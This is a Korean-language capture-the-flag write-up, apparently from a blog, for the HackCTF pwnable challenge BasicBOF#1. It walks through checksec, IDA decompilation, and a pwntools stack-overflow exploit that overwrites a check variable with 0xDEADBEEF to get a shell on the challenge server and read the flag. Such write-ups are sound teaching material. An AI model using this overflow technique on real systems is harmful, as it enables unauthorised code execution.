- 오늘은 HackCTF의 Pwnable문제인 BasicBOF#1을 풀어보도록 하겠습니다.

![](https://images.velog.io/images/dsph9245/post/f8ee1bbd-fd8f-47a8-81af-8f3963ca81fe/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202021-09-15%20%EC%98%A4%EC%A0%84%202.27.46.png)

- 문제 서버를 확인하고 문제파일을 다운로드 해주겠습니다.

![](https://images.velog.io/images/dsph9245/post/15b5a3ce-f4fd-4561-b4c7-6618325b95ce/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202021-09-15%20%EC%98%A4%EC%A0%84%202.28.29.png)

- 제일 먼저 nc서버에 접속해보겠습니다.

- 실행을 시켜보면 입력한 값([buf])와 check를 출력합니다.

![](https://images.velog.io/images/dsph9245/post/ce1a9276-1450-4dc5-8e1f-466aa688363e/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202021-09-15%20%EC%98%A4%EC%A0%84%202.35.08.png)

![](https://images.velog.io/images/dsph9245/post/17db2ae8-d9b8-477e-a63f-651a7885e95b/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202021-09-15%20%EC%98%A4%EC%A0%84%202.46.43.png)

- 다음으로 checksec을 통해서 걸려있는 보호기법을 확인해보겠습니다.

- 보호 기법으로는 RELRO와 NX가 걸려 있네요

- RELRO 보호기법이란? : RELocation Read-Only의 줄임말이며, ELF바이너리 / 프로세스 데이터 섹션의 보안을 강화하는 일반적인 기술을 의미합니다.

- NX보호기법이란? : NX 비트를 활성화시켜서 스택 / 힙 영역의 실행 권한을 제거하여 쉘의 실행을 방지하는 기법입니다.

- 여기서 중요한 것은 NX보호기법입니다. (쉘을 실행시킬 수 없기 때문입니다.)

![](https://images.velog.io/images/dsph9245/post/004e1eb5-1ed9-4d14-9dc4-d4b405009c3e/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202021-09-15%20%EC%98%A4%EC%A0%84%203.07.13.png)

- 일단은 IDA를 이용해서 분석해주겠습니다!

- 그리고나서 MAIN을 봐줍니다.

![](https://images.velog.io/images/dsph9245/post/27d9a2b6-f262-4bec-bfbc-aa67a868ad9e/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA%202021-09-23%20%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE%204.02.29.png)

- F5를 눌러서 C언어로 봐줍니다. 

![](https://images.velog.io/images/dsph9245/post/c04ca566-cf0e-49ee-b400-c8e76a9aa3a6/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA%202021-09-23%20%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE%204.04.01.png)

- main코드에서 -559038737과 같은 값들을 'H'를 눌러서 16진수 형태로 변경해서 봐줍시다. 

![](https://images.velog.io/images/dsph9245/post/5741473a-abde-49a0-8c07-bf8e06091b2f/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA%202021-09-23%20%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE%204.05.47.png)

- v5가 s보다 더 높은 주소를 가지고 있고 s에 45byte만큼 입력하는 것을 통해 v5의 값을 변경할 수 있습니다. fgets를 통해 v5의 값을 0xDEADBEEF로 바꿔주면 쉘을 딸 수 있을 것 같습니다. 

- 일단 제일 먼저 빅엔디안 방식인 0xDEADBEEF를 리틀엔디안으로 바꿔주겠습니다.

- 리틀엔디안으로 변환한 값은 \xef\xbe\xad\xde입니다.

- 이를 기반으로 exploit code를 작성해보겠습니다.

```
from pwn import *

p = remote("ctf.j0n9hyun.xyz", 3000)

payload = 'a' * 40 
payload += "\xef\xbe\xad\xde"

p.sendline(payload)
p.interactive()
```

- 익스를 실행해보겠습니다.

- 익스를 실행하면 다음과 같은 화면이 나오는데요

![](https://images.velog.io/images/dsph9245/post/84c2b47b-45a7-4915-b703-e6c87ed1be0f/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA%202021-09-23%20%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE%205.08.45.png)

- ls를 입력해서 디렉터리 상에 있는 파일 목록을 확인해줍니다.

![](https://images.velog.io/images/dsph9245/post/8dc4e581-bb6d-432a-b2ab-e5fc9b63fcb9/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA%202021-09-23%20%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE%205.09.13.png)

- flag 파일과 main 파일이 있네요

- cat 명령어를 사용해서 flag 파일 내부를 보면 플래그를 얻을 수 있습니다.

![](https://images.velog.io/images/dsph9245/post/7769bf3a-4afd-4335-8ed1-6695f8998460/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA%202021-09-23%20%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE%205.09.24.png)

- 해당 플래그를 문제 서버에 제출해주면

![](https://images.velog.io/images/dsph9245/post/0428c979-cf40-478d-af3a-caa24157ead3/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA%202021-09-23%20%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE%205.10.03.png)

- 정상적으로 solve가 되는 것을 확인하실 수 있습니다.

![](https://images.velog.io/images/dsph9245/post/70f97594-34ef-4d91-8c93-7e8d2e7df50d/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA%202021-09-23%20%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE%205.10.08.png)
